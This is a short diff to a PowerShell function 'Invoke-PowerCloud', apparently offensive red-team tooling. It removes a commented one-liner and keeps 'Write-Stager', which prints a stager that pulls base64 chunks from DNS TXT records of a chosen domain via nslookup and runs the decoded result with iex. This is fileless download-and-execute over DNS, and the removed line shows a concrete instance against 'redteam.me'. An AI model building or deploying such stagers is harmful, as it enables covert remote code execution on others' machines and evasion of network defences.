@@ -162,7 +162,6 @@ function Invoke-PowerCloud() {
     }
 
     function Write-Stager($chunksCount, $nameServer) {
-        # $b64=""; (1..4) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me" greg.ns.cloudflare.com)[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
         $stager = '$b64=""; (1..'+$chunksCount+') | ForEach-Object { $b64+=(nslookup -q=txt "$_.' + $Domain + '" ' + $nameServer + ')[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace(''\t|"'',"")))))'
         Write-Host $stager
     }
